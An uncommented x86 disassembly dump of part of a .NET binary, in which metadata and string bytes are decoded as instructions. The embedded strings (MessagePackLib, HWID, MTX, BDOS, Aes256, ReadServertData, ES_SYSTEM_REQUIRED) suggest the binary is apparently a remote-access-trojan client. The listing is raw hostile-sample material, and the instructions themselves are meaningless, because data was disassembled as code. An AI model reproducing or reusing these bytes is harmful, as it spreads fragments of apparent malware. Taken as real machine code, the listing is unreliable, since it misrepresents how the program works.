  407611:	0c 69                	or     $0x69,%al
  407613:	02 00                	add    (%eax),%al
  407615:	00 db                	add    %bl,%bl
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	06                   	push   %es
  40761d:	19 71 02             	sbb    %esi,0x2(%ecx)
  407620:	00 00                	add    %al,(%eax)
  407622:	87 1c 75 02 00 00 fd 	xchg   %ebx,-0x2fffffe(,%esi,2)
  407629:	07                   	pop    %es
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 20                	add    %ah,(%eax)
  407705:	0f 13 0f             	movlps %xmm1,(%edi)
  407708:	2b 0f                	sub    (%edi),%ecx
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	fe                   	(bad)
  40771b:	1b 01                	sbb    (%ecx),%eax
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	e9 1b 01 00 00       	jmp    0x407842
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	eb 05                	jmp    0x407731
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	ff 1a                	lcall  *(%edx)
  407734:	02 00                	add    (%eax),%al
  407736:	40                   	inc    %eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	bf 08 02 00 40       	mov    $0x40000208,%edi
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	7c 0e                	jl     0x407752
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	37                   	aaa
  407765:	01 00                	add    %eax,(%eax)
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	bd 02 00 00 00       	mov    $0x2,%ebp
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	ec                   	in     (%dx),%al
  40778b:	0f 00 00             	sldt   (%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 d2                	add    %dl,%dl
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	47                   	inc    %edi
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 e1                	add    %ah,%cl
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 7d 1a             	add    %bh,0x1a(%ebp)
  4077dc:	00 00                	add    %al,(%eax)
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4077ef:	17                   	pop    %ss
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 93 12 00 00 00    	add    %dl,0x12(%ebx)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	49                   	dec    %ecx
  40782f:	45                   	inc    %ebp
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
  407831:	75 6d                	jne    0x4078a0
  407833:	65 72 61             	gs jb  0x407897
  407836:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40783a:	31 00                	xor    %eax,(%eax)
  40783c:	43                   	inc    %ebx
  40783d:	61                   	popa
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	53                   	push   %ebx
  407841:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407848:	69 
  407849:	73 74                	jae    0x4078bf
  40784b:	60                   	pusha
  40784c:	31 00                	xor    %eax,(%eax)
  40784e:	61                   	popa
  40784f:	31 00                	xor    %eax,(%eax)
  407851:	76 31                	jbe    0x407884
  407853:	00 5f 5f             	add    %bl,0x5f(%edi)
  407856:	53                   	push   %ebx
  407857:	74 61                	je     0x4078ba
  407859:	74 69                	je     0x4078c4
  40785b:	63 41 72             	arpl   %eax,0x72(%ecx)
  40785e:	72 61                	jb     0x4078c1
  407860:	79 49                	jns    0x4078ab
  407862:	6e                   	outsb  %ds:(%esi),(%dx)
  407863:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40786a:	69 
  40786b:	7a 65                	jp     0x4078d2
  40786d:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407872:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407879:	74 2e                	je     0x4078a9
  40787b:	57                   	push   %edi
  40787c:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 33                	je     0x4078bb
  407888:	32 00                	xor    (%eax),%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	53                   	push   %ebx
  407893:	77 61                	ja     0x4078f6
  407895:	70 49                	jo     0x4078e0
  407897:	6e                   	outsb  %ds:(%esi),(%dx)
  407898:	74 33                	je     0x4078cd
  40789a:	32 00                	xor    (%eax),%al
  40789c:	3c 3e                	cmp    $0x3e,%al
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	5f                   	pop    %edi
  4078a0:	5f                   	pop    %edi
  4078a1:	32 00                	xor    (%eax),%al
  4078a3:	61                   	popa
  4078a4:	32 00                	xor    (%eax),%al
  4078a6:	58                   	pop    %eax
  4078a7:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078ac:	72 74                	jb     0x407922
  4078ae:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078b5:	32 00                	xor    (%eax),%al
  4078b7:	76 32                	jbe    0x4078eb
  4078b9:	00 76 33             	add    %dh,0x33(%esi)
  4078bc:	00 57 72             	add    %dl,0x72(%edi)
  4078bf:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078c6:	36 
  4078c7:	34 00                	xor    $0x0,%al
  4078c9:	54                   	push   %esp
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	55                   	push   %ebp
  4078cc:	49                   	dec    %ecx
  4078cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ce:	74 36                	je     0x407906
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	47                   	inc    %edi
  4078d3:	65 74 41             	gs je  0x407917
  4078d6:	73 55                	jae    0x40792d
  4078d8:	49                   	dec    %ecx
  4078d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078da:	74 36                	je     0x407912
  4078dc:	34 00                	xor    $0x0,%al
  4078de:	53                   	push   %ebx
  4078df:	65 74 41             	gs je  0x407923
  4078e2:	73 55                	jae    0x407939
  4078e4:	49                   	dec    %ecx
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	74 36                	je     0x40791e
  4078e8:	34 00                	xor    $0x0,%al
  4078ea:	54                   	push   %esp
  4078eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	53                   	push   %ebx
  4078f3:	77 61                	ja     0x407956
  4078f5:	70 49                	jo     0x407940
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	55                   	push   %ebp
  4078ff:	49                   	dec    %ecx
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 31                	je     0x407934
  407903:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  40790f:	61                   	popa
  407910:	70 49                	jo     0x40795b
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407919:	41                   	inc    %ecx
  40791a:	43                   	inc    %ebx
  40791b:	53                   	push   %ebx
  40791c:	48                   	dec    %eax
  40791d:	41                   	inc    %ecx
  40791e:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407924:	61                   	popa
  407925:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40792b:	73 32                	jae    0x40795f
  40792d:	35 36 00 61 65       	xor    $0x65610036,%eax
  407932:	73 32                	jae    0x407966
  407934:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407939:	53                   	push   %ebx
  40793a:	74 61                	je     0x40799d
  40793c:	74 69                	je     0x4079a7
  40793e:	63 41 72             	arpl   %eax,0x72(%ecx)
  407941:	72 61                	jb     0x4079a4
  407943:	79 49                	jns    0x40798e
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40794d:	69 
  40794e:	7a 65                	jp     0x4079b5
  407950:	3d 36 00 41 46       	cmp    $0x46410036,%eax
  407955:	38 38                	cmp    %bh,(%eax)
  407957:	00 67 65             	add    %ah,0x65(%edi)
  40795a:	74 5f                	je     0x4079bb
  40795c:	55                   	push   %ebp
  40795d:	54                   	push   %esp
  40795e:	46                   	inc    %esi
  40795f:	38 00                	cmp    %al,(%eax)
  407961:	3c 4d                	cmp    $0x4d,%al
  407963:	6f                   	outsl  %ds:(%esi),(%dx)
  407964:	64 75 6c             	fs jne 0x4079d3
  407967:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  40796c:	73 73                	jae    0x4079e1
  40796e:	61                   	popa
  40796f:	67 65 50             	addr16 gs push %eax
  407972:	61                   	popa
  407973:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407976:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  40797d:	76 61                	jbe    0x4079e0
  40797f:	74 65                	je     0x4079e6
  407981:	49                   	dec    %ecx
  407982:	6d                   	insl   (%dx),%es:(%edi)
  407983:	70 6c                	jo     0x4079f1
  407985:	65 6d                	gs insl (%dx),%es:(%edi)
  407987:	65 6e                	outsb  %gs:(%esi),(%dx)
  407989:	74 61                	je     0x4079ec
  40798b:	74 69                	je     0x4079f6
  40798d:	6f                   	outsl  %ds:(%esi),(%dx)
  40798e:	6e                   	outsb  %ds:(%esi),(%dx)
  40798f:	44                   	inc    %esp
  407990:	65 74 61             	gs je  0x4079f4
  407993:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40799a:	42 
  40799b:	32 41 31             	xor    0x31(%ecx),%al
  40799e:	46                   	inc    %esi
  40799f:	39 39                	cmp    %edi,(%ecx)
  4079a1:	30 32                	xor    %dh,(%edx)
  4079a3:	42                   	inc    %edx
  4079a4:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079aa:	38 30                	cmp    %dh,(%eax)
  4079ac:	45                   	inc    %ebp
  4079ad:	46                   	inc    %esi
  4079ae:	31 36                	xor    %esi,(%esi)
  4079b0:	39 32                	cmp    %esi,(%edx)
  4079b2:	43                   	inc    %ebx
  4079b3:	45                   	inc    %ebp
  4079b4:	39 39                	cmp    %edi,(%ecx)
  4079b6:	34 37                	xor    $0x37,%al
  4079b8:	41                   	inc    %ecx
  4079b9:	31 39                	xor    %edi,(%ecx)
  4079bb:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079bf:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079c2:	44                   	inc    %esp
  4079c3:	38 46 35             	cmp    %al,0x35(%esi)
  4079c6:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079ca:	41                   	inc    %ecx
  4079cb:	37                   	aaa
  4079cc:	32 31                	xor    (%ecx),%dh
  4079ce:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079d4:	43                   	inc    %ebx
  4079d5:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079da:	43                   	inc    %ebx
  4079db:	00 45 53             	add    %al,0x53(%ebp)
  4079de:	5f                   	pop    %edi
  4079df:	53                   	push   %ebx
  4079e0:	59                   	pop    %ecx
  4079e1:	53                   	push   %ebx
  4079e2:	54                   	push   %esp
  4079e3:	45                   	inc    %ebp
  4079e4:	4d                   	dec    %ebp
  4079e5:	5f                   	pop    %edi
  4079e6:	52                   	push   %edx
  4079e7:	45                   	inc    %ebp
  4079e8:	51                   	push   %ecx
  4079e9:	55                   	push   %ebp
  4079ea:	49                   	dec    %ecx
  4079eb:	52                   	push   %edx
  4079ec:	45                   	inc    %ebp
  4079ed:	44                   	inc    %esp
  4079ee:	00 45 53             	add    %al,0x53(%ebp)
  4079f1:	5f                   	pop    %edi
  4079f2:	44                   	inc    %esp
  4079f3:	49                   	dec    %ecx
  4079f4:	53                   	push   %ebx
  4079f5:	50                   	push   %eax
  4079f6:	4c                   	dec    %esp
  4079f7:	41                   	inc    %ecx
  4079f8:	59                   	pop    %ecx
  4079f9:	5f                   	pop    %edi
  4079fa:	52                   	push   %edx
  4079fb:	45                   	inc    %ebp
  4079fc:	51                   	push   %ecx
  4079fd:	55                   	push   %ebp
  4079fe:	49                   	dec    %ecx
  4079ff:	52                   	push   %edx
  407a00:	45                   	inc    %ebp
  407a01:	44                   	inc    %esp
  407a02:	00 4d 61             	add    %cl,0x61(%ebp)
  407a05:	70 4e                	jo     0x407a55
  407a07:	61                   	popa
  407a08:	6d                   	insl   (%dx),%es:(%edi)
  407a09:	65 54                	gs push %esp
  407a0b:	6f                   	outsl  %ds:(%esi),(%dx)
  407a0c:	4f                   	dec    %edi
  407a0d:	49                   	dec    %ecx
  407a0e:	44                   	inc    %esp
  407a0f:	00 48 57             	add    %cl,0x57(%eax)
  407a12:	49                   	dec    %ecx
  407a13:	44                   	inc    %esp
  407a14:	00 67 65             	add    %ah,0x65(%edi)
  407a17:	74 5f                	je     0x407a78
  407a19:	46                   	inc    %esi
  407a1a:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1b:	72 6d                	jb     0x407a8a
  407a1d:	61                   	popa
  407a1e:	74 49                	je     0x407a69
  407a20:	44                   	inc    %esp
  407a21:	00 45 58             	add    %al,0x58(%ebp)
  407a24:	45                   	inc    %ebp
  407a25:	43                   	inc    %ebx
  407a26:	55                   	push   %ebp
  407a27:	54                   	push   %esp
  407a28:	49                   	dec    %ecx
  407a29:	4f                   	dec    %edi
  407a2a:	4e                   	dec    %esi
  407a2b:	5f                   	pop    %edi
  407a2c:	53                   	push   %ebx
  407a2d:	54                   	push   %esp
  407a2e:	41                   	inc    %ecx
  407a2f:	54                   	push   %esp
  407a30:	45                   	inc    %ebp
  407a31:	00 38                	add    %bh,(%eax)
  407a33:	37                   	aaa
  407a34:	36 33 39             	xor    %ss:(%ecx),%edi
  407a37:	31 32                	xor    %esi,(%edx)
  407a39:	36 45                	ss inc %ebp
  407a3b:	41                   	inc    %ecx
  407a3c:	37                   	aaa
  407a3d:	37                   	aaa
  407a3e:	42                   	inc    %edx
  407a3f:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a45:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a4a:	37                   	aaa
  407a4b:	44                   	inc    %esp
  407a4c:	42                   	inc    %edx
  407a4d:	41                   	inc    %ecx
  407a4e:	36 37                	ss aaa
  407a50:	43                   	inc    %ebx
  407a51:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a56:	46                   	inc    %esi
  407a57:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a5c:	39 38                	cmp    %edi,(%eax)
  407a5e:	38 38                	cmp    %bh,(%eax)
  407a60:	45                   	inc    %ebp
  407a61:	44                   	inc    %esp
  407a62:	30 37                	xor    %dh,(%edi)
  407a64:	30 43 44             	xor    %al,0x44(%ebx)
  407a67:	34 30                	xor    $0x30,%al
  407a69:	45                   	inc    %ebp
  407a6a:	31 46 36             	xor    %eax,0x36(%esi)
  407a6d:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a73:	67 65 74 5f          	addr16 gs je 0x407ad6
  407a77:	41                   	inc    %ecx
  407a78:	53                   	push   %ebx
  407a79:	43                   	inc    %ebx
  407a7a:	49                   	dec    %ecx
  407a7b:	49                   	dec    %ecx
  407a7c:	00 53 79             	add    %dl,0x79(%ebx)
  407a7f:	73 74                	jae    0x407af5
  407a81:	65 6d                	gs insl (%dx),%es:(%edi)
  407a83:	2e 49                	cs dec %ecx
  407a85:	4f                   	dec    %edi
  407a86:	00 49 73             	add    %cl,0x73(%ecx)
  407a89:	58                   	pop    %eax
  407a8a:	50                   	push   %eax
  407a8b:	00 42 44             	add    %al,0x44(%edx)
  407a8e:	4f                   	dec    %edi
  407a8f:	53                   	push   %ebx
  407a90:	00 45 53             	add    %al,0x53(%ebp)
  407a93:	5f                   	pop    %edi
  407a94:	43                   	inc    %ebx
  407a95:	4f                   	dec    %edi
  407a96:	4e                   	dec    %esi
  407a97:	54                   	push   %esp
  407a98:	49                   	dec    %ecx
  407a99:	4e                   	dec    %esi
  407a9a:	55                   	push   %ebp
  407a9b:	4f                   	dec    %edi
  407a9c:	55                   	push   %ebp
  407a9d:	53                   	push   %ebx
  407a9e:	00 67 65             	add    %ah,0x65(%edi)
  407aa1:	74 5f                	je     0x407b02
  407aa3:	49                   	dec    %ecx
  407aa4:	56                   	push   %esi
  407aa5:	00 73 65             	add    %dh,0x65(%ebx)
  407aa8:	74 5f                	je     0x407b09
  407aaa:	49                   	dec    %ecx
  407aab:	56                   	push   %esi
  407aac:	00 47 65             	add    %al,0x65(%edi)
  407aaf:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab0:	65 72 61             	gs jb  0x407b14
  407ab3:	74 65                	je     0x407b1a
  407ab5:	49                   	dec    %ecx
  407ab6:	56                   	push   %esi
  407ab7:	00 4d 54             	add    %cl,0x54(%ebp)
  407aba:	58                   	pop    %eax
  407abb:	00 76 61             	add    %dh,0x61(%esi)
  407abe:	6c                   	insb   (%dx),%es:(%edi)
  407abf:	75 65                	jne    0x407b26
  407ac1:	5f                   	pop    %edi
  407ac2:	5f                   	pop    %edi
  407ac3:	00 52 65             	add    %dl,0x65(%edx)
  407ac6:	61                   	popa
  407ac7:	64 53                	fs push %ebx
  407ac9:	65 72 76             	gs jb  0x407b42
  407acc:	65 72 74             	gs jb  0x407b43
  407acf:	44                   	inc    %esp
  407ad0:	61                   	popa
  407ad1:	74 61                	je     0x407b34
  407ad3:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ad7:	61                   	popa
  407ad8:	00 6d 73             	add    %ch,0x73(%ebp)
  407adb:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ade:	6c                   	insb   (%dx),%es:(%edi)
  407adf:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407ae6:	65 6d                	gs insl (%dx),%es:(%edi)
  407ae8:	2e 43                	cs inc %ebx
  407aea:	6f                   	outsl  %ds:(%esi),(%dx)
  407aeb:	6c                   	insb   (%dx),%es:(%edi)
  407aec:	6c                   	insb   (%dx),%es:(%edi)
  407aed:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407af2:	6e                   	outsb  %ds:(%esi),(%dx)
  407af3:	73 2e                	jae    0x407b23
  407af5:	47                   	inc    %edi
  407af6:	65 6e                	outsb  %gs:(%esi),(%dx)
  407af8:	65 72 69             	gs jb  0x407b64
  407afb:	63 00                	arpl   %eax,(%eax)
  407afd:	4d                   	dec    %ebp
  407afe:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b05:	74 2e                	je     0x407b35
  407b07:	56                   	push   %esi
  407b08:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b0f:	73 69                	jae    0x407b7a
  407b11:	63 00                	arpl   %eax,(%eax)
  407b13:	67 65 74 5f          	addr16 gs je 0x407b76
  407b17:	53                   	push   %ebx
  407b18:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b1a:	64 53                	fs push %ebx
  407b1c:	79 6e                	jns    0x407b8c
  407b1e:	63 00                	arpl   %eax,(%eax)
  407b20:	45                   	inc    %ebp
  407b21:	6e                   	outsb  %ds:(%esi),(%dx)
  407b22:	64 52                	fs push %edx
  407b24:	65 61                	gs popa
  407b26:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b2a:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b31:	00 
  407b32:	54                   	push   %esp
  407b33:	68 72 65 61 64       	push   $0x64616572
  407b38:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b3c:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b40:	6e                   	outsb  %ds:(%esi),(%dx)
  407b41:	65 72 41             	gs jb  0x407b85
  407b44:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b49:	41                   	inc    %ecx
  407b4a:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b50:	61                   	popa
  407b51:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b57:	74 5f                	je     0x407bb8
  407b59:	43                   	inc    %ebx
  407b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5c:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b62:	00 67 65             	add    %ah,0x65(%edi)
  407b65:	74 5f                	je     0x407bc6
  407b67:	49                   	dec    %ecx
  407b68:	73 43                	jae    0x407bad
  407b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b6c:	6e                   	outsb  %ds:(%esi),(%dx)
  407b6d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b72:	00 73 65             	add    %dh,0x65(%ebx)
  407b75:	74 5f                	je     0x407bd6
  407b77:	49                   	dec    %ecx
  407b78:	73 43                	jae    0x407bbd
  407b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7c:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b82:	00 52 65             	add    %dl,0x65(%edx)
  407b85:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b88:	76 65                	jbe    0x407bef
  407b8a:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b8e:	74 5f                	je     0x407bef
